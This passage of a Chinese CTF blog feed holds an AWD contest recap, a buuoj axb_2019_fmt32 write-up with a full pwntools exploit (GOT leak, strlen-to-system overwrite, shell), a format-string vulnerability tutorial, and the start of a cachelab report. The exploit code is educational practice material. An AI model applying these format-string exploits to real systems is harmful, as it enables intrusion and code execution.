    <content type="html"><![CDATA[<p>这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。</p><span id="more"></span><p>先说一下大体的感想，awd真的比ctf好玩太多了，awd能真正体会到那么多网络安全爱好者相互网络攻击的那种乐趣。</p><p>首先入场开始比赛的时候真的是啥也不知道，不过好在有学长带队，啥也不会的我终于在第三轮的时候连上了自己的靶机hhh。学长是打web的，但是在场的web师傅都太厉害了，上的不死马不仅让我们队的靶机down机还不停地拿flag，甚至最后删库都阻止不了他们拿flag。</p><p>咱们第一天的web三题有一题不停地down机又被打，在下午，也是第24，25轮的时候有人ddos题目让所有人都down机了，主办方重启环境还恢复了配置，这可以说是让我们捡了一个漏，因为相当于是帮我们修好了环境，题目上线的时候果断删库，及时保住了一些分，与此同时通过查流量以及不停地测试也是把pwn题的payload给拿到了，因为整个pwn题的输入就是一个0x2000字节的read，查流量也不是很难。但是由于师傅们上午就pwn出了第一道，我也是在不停地堵pwn的漏洞，到最后给自己弄down机了，删库还是没用，依然被打，所以下午我打算不补pwn题让他们随便打了，这波至少赚了几千分。</p><p>第二天的pwn两题都很简单，依然查流量包抄的payload拿下了大部分队伍的pwn分数，修洞的时候又不小心down了，还被打，我就又删库，可是还是有人打，结果最后就是环境恢复不了，全场就咱们队oop那道pwn题down了。最关键是down就down了，还有人打就无语了。。唯一的一道web题依然中了不死马导致又down又被打，每轮稳定扣500分(web 又down又被打，pwn1又down又被打，pwn2一直被打)，还好pwn 多数队伍没有补，最基本的几百分还是能填上坑的。上午从rk40冲进了rk33，rk33是稳稳地三等奖，但是自从少数师傅修好了pwn题局势就开始不妙了，本来我打死不想修的，但是看到有些队伍修成功了我不禁又被诱惑了，但是结果还是不随人愿。所以pwn2我就没有去修了。最终榜上rk36，那都是非常卡奖项的一个位置。因为三等奖是40%-60%。首先得刚好60%*60队=36队。但是有队伍没去比赛要扣名额就比较危险了。最终不知是主办方还是按照60队60%比例算了还是前面队伍有人ddos或者上通防被查了我们还是很幸运地挤进了三等奖的最后一个名额，这是最最最开心的。</p><p>当然本次线下awd收获的经验也是非常多的，比如前面复盘介绍的pwn题被check down 的原因是:未给权限，也是linux基础不牢吧。前几次patch的elf文件守住了两轮，之后还是被打。昨晚我苦思冥想想了很久，问了很多师傅，最终N0vice师傅一语点通了发生的一切自己解释不了的事。第一次patch的elf文件是直接覆盖的，因此权限维持相同，并且很多师傅拿通用脚本打不通我的靶机，机子也没有check down。后来被打是因为真的有人无聊开始拿payload直接nc 去连接维持一个shell权限，我以为是被打通了接着换方式patch，殊不知靶机上面又几页的shell进程留在那边，这是我真没想到的。我还以为是我patch的有问题，就删文件上传，结果权限不够导致无法通过check down，与此同时还有队伍留了shell进程一直被打。</p><p>awd比赛真的太好玩了，期待下次的awd比赛。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="awd" scheme="http://example.com/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>axb_2019_fmt32 wp</title>
    <link href="http://example.com/2021/06/08/axb_2019_fmt32%20wp/"/>
    <id>http://example.com/2021/06/08/axb_2019_fmt32%20wp/</id>
    <published>2021-06-08T02:00:00.000Z</published>
    <updated>2021-10-25T04:29:40.451Z</updated>
    
    <content type="html"><![CDATA[<p>临近期末考试了，终于可以光明正大地水博客了。</p><span id="more"></span><p>最近刚写上格式化字符串的漏洞，这不，他来了。这个题目我做过之后感觉难度还是有的，做出这一题至少对格式化字符串漏洞的利用是有一个较深的理解了的。它综合考察了<code>ret2libc</code>和格式化字符串的任意写，以及对got表的理解。</p><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt32">axb_2019_fmt32</a></h2><p>下载文件，反汇编打开，再反编译<code>main()</code>函数得到如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找字符串并没有发现<code>flag</code>,<code>/bin/sh</code>等字眼，plt表也没有装载<code>system</code>函数，那就分析main函数，一个很明显的格式化字符串漏洞<code>printf(format);</code> <code>format</code>是由我们控制的，首先清楚一点，程序采取read函数读取我们的输入，大小卡的也很死，无法溢出。</p><h3 id="泄露libc地址的准备"><a href="#泄露libc地址的准备" class="headerlink" title="泄露libc地址的准备"></a>泄露libc地址的准备</h3><p>那么我们第一步肯定也是泄露libc的地址，不能溢出那就不能构造rop链去输出，只能用程序本身的printf去输出。我们目前能确定的只有libc函数got表地址，而got表地址的值装的才是libc函数的地址。通俗点讲我现在知道一个地址，但是我要的是这个地址的值。<code>%d %x %f</code>那些都是你传什么就输出什么。举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="comment">//假设&amp;a=0x61616161</span></span><br><span class="line"><span class="keyword">int</span> b=&amp;a;</span><br></pre></td></tr></table></figure><p>当热这种写法是错的，但是逻辑应该都能理解的。如果我知道b的值了，那么我如何知道b的值所代表的地址的值呢，如果<code>printf(&quot;%d&quot;,b);</code>的话，那么你只能得到<code>0x61616161</code>而得不到你想要的<code>0xdeadbeef</code>，这个时候就要提到一个知识点了:字符串传参，我在之前的博客应该也有所讲过，字符串传参是用指针传的。因为字符串是大端序，所以一个指针的字符串判定是从这个指针开始一直到下一个<code>&#39;\0&#39;</code>字节(向高地址)为这个指针代表的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value:  00 41 42 43 44 45 43 41 00</span><br><span class="line">address:00 01 02 03 04 05 06 07 08</span><br></pre></td></tr></table></figure><p>那么04字符串就是<code>deca</code></p><p>03字符串就是<code>cdeca</code></p><p>以此类推。。。</p><p>那么字符串就成了泄露libc地址的有利工具，<code>printf(&quot;%s&quot;,b);</code>就可以泄露libc函数的地址了。</p><h3 id="确定偏移泄露libc寻找system函数地址"><a href="#确定偏移泄露libc寻找system函数地址" class="headerlink" title="确定偏移泄露libc寻找system函数地址"></a>确定偏移泄露libc寻找system函数地址</h3><p>确定偏移从来是看不出来的，要自己动调去确定偏移，直接运行会发现有时钟控制，那么我们gdb调试，在read和printf函数都下断点，输入<code>aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x</code></p><p>得到结果：</p><p><img src="https://i.loli.net/2021/06/08/LxJ63SAr1KdH9qb.png" alt="buuoj axb_2019_fmt32_1.png"></p><p>可以看到我们输入的4个a在printf里面被分割了，第8个参数有3个a(0x61)，第7个参数有1个，那么我们把第七个参数填充完整之后再在第八个参数的位置放上libc函数的got表地址，然后在最后加上<code>%8$s</code>就可以泄露libc地址了。</p><p>这里我选择泄露<code>puts</code>函数的地址</p><p>第一次payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;%8$s\0s&#x27;</span></span><br></pre></td></tr></table></figure><p>因为输出不单单只是输出payload，还加了很多junk数据，因此我们可以考虑在输出之前加一个特殊字符<code>&#39;\n&#39;</code>那么 我们在<code>p.recvuntil(b&#39;\n&#39;)</code>之后接收的四个字节一定就是puts的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br></pre></td></tr></table></figure><p>这样我们就很轻松地得到了<code>system()</code>函数的地址</p><h3 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h3><p>我们不需要泄露<code>/bin/sh</code>字符串，因为之前就说了，我们并不能栈溢出劫持程序控制流，因此要考虑其它方法，printf可以任意写，那么我们就修改got表的内容，如果把strlen函数的got表改成system的地址，那么在调用strlen的时候就会执行system函数了。用printf函数应该也可以，但是人家改的时候就是在执行printf，所以给了你strlen就开开心心用嘛对吧。</p><p>由于一个地址的值比较大，一次覆盖要输出最多可能输出<code>0xffffffff</code>四十多亿个字符，最少也是<code>0xf7000000</code>个字符。所以我们采取分次赋值，把这个地址分成高字和低字，这样一次最多输出<code>0xffff</code>六万多个字符，在可接受的范围内，我们必须要一次赋值赋完，否则只赋一半就停，下面执行strlen函数就不在预期之内，会引发诸多错误，所以要改got表得一次改完。因为libc的基址一般都是0xf7开头的，所以这个函数高字肯定比较大，那么我们就先赋低字，在赋高字，缺的字符中间算算差值补足就好了。</p><p>这里又要介绍一个格式化字符串标识符了</p><p><code>%n$hn</code>给第n个参数地址赋值当前已打印字符的个数(大小为一个字(word))。那么我们就需要精心构造payload了，注意输出不止一个payload，还要注意前面的一些junk，经过计算，payload如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一步就是给<code>/bin/sh</code>字符串了，第三次输入很简单，直接给<code>;/bin/sh;</code>即可，分号用于过滤前面的junk数据。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line"><span class="comment">#p=process(proc)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25544</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br><span class="line">sys_high=(sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">sys_low=sys&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_low:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_low)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_high:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_high)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;临近期末考试了，终于可以光明正大地水博客了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞利用</title>
    <link href="http://example.com/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</id>
    <published>2021-06-05T02:00:00.000Z</published>
    <updated>2021-10-25T04:39:26.324Z</updated>
    
    <content type="html"><![CDATA[<p>格式化字符串漏洞是printf函数比较常见的漏洞，常见的漏洞形式就是<code>printf(s);</code>如果s字符是我们可控的话，那就会导致任意位置读和写等严重的后果。</p><span id="more"></span><p>首先如下代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure><p>逻辑看上去十分简单，就是输入什么就输出什么。避免这类漏洞的方式也很简单，固定第一个参数就可以了，但是现在第一个参数我们可控的话就要介绍一些平时用不到的格式化字符串的标识符了。</p><p><code>%d %f %x %s</code>这些烂大街的相信都不用讲也会，讲讲其它的标识符</p><p><code>%p</code>:输出第n个参数的十六进制值，目前测试与<code>%x</code>不一样的地方就是输出会带<code>0x</code>，并且%后面带的整型参数表示第几个参数而非参数长度。</p><p><code>%n</code>:将已打印字符串长度输入到下一个参数所表示的地址去，%后面带的整型参数表示要输出的第几个参数。</p><p>注：以上结论皆是在Ubuntu18.0.4环境下使用gcc编译器得到的</p><p>那么通过以上两个较生僻格式化的标识符就可以达到任意读和任意写了。</p><h2 id="p达到任意读的目的"><a href="#p达到任意读的目的" class="headerlink" title="%p达到任意读的目的"></a>%p达到任意读的目的</h2><p>现在有以下测试程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">printf</span>(buf,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们在64位的环境下编译，所以刚好给6个参数占满寄存器，那么此时我输入一个<code>%6$p</code>就可以直接输出<code>%6$p</code>这个字符串所对应的<code>long</code>的值(因为64位栈的宽度为8字节，所以被迫输出long型整数)</p><p><img src="https://i.loli.net/2021/06/05/eWljw5DEnZ9b1gm.png" alt="format string_1.png"></p><p>这里可以很清楚看到<code>70243625</code>就是字符串<code>%6$p</code>小端输出的结果，如果量一下缓冲区到rbp的距离我们还可以把栈的地址泄露出来，这就是任意读，地址一旦泄露那么可以做的事情就非常多了，如果加了canary甚至可以无视canary溢出。</p><h2 id="n达到任意写目的"><a href="#n达到任意写目的" class="headerlink" title="%n达到任意写目的"></a>%n达到任意写目的</h2><p>我们的测试程序是这样写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>,d=<span class="number">0</span>,e=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">printf</span>(buf,&amp;a,&amp;b,&amp;c,&amp;d,&amp;e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%d %d %d %d %d\n&quot;</span>,a,b,c,d,e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个测试程序略微化简了一点，要修改的变量地址直接传参进去了，在实际攻击的过程中可不会这么给你提供，你需要算偏移然后将地址给格式化字符串定点修改某个变量的值，这就是所谓的任意写。</p><p><img src="https://i.loli.net/2021/06/05/ZLVsORBKiYxXA5I.png" alt="format string_2.png"></p><p>这里可以看到，通过我的输入成功改变了三个变量的值</p><p>这就是格式化字符串漏洞的利用。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;格式化字符串漏洞是printf函数比较常见的漏洞，常见的漏洞形式就是&lt;code&gt;printf(s);&lt;/code&gt;如果s字符是我们可控的话，那就会导致任意位置读和写等严重的后果。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>cachelab实验报告:模拟cache的功能</title>
    <link href="http://example.com/2021/05/22/cachelab/"/>
    <id>http://example.com/2021/05/22/cachelab/</id>
    <published>2021-05-22T14:00:00.000Z</published>
    <updated>2021-10-25T05:23:54.463Z</updated>
    
    <content type="html"><![CDATA[<p><code>lab</code>从这里开始变得难了起来了，这次要模拟计算机里的一个硬件-<code>cache</code>的工作，关于<code>cache</code>，百度百科介绍的比我好，这边请<a href="https://baike.baidu.com/item/CACHE%E5%AD%98%E5%82%A8%E5%99%A8/12789048?fr=aladdin">———&gt;</a></p><span id="more"></span><p>然后咱们就先拿到实验用的文件以及他的<code>writeup</code>，看完一会之后<code>(long long after)</code>就知道了此次实验的目的。然后文件也知道的一清二楚了。</p><p><code>csim.c</code>:用来做part A的主要文件。</p><p>tra<code>n</code>s.c:用来做part B的主要文件。</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p><code>writeup</code>里面已经提到了，<code>cache.h</code>头文件里面有所需的函数并且要在<code>csim.c</code>里面完成<code>cache</code>的模拟过程，那么首先我们看看<code>cache.h</code>头文件提供了哪些东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span 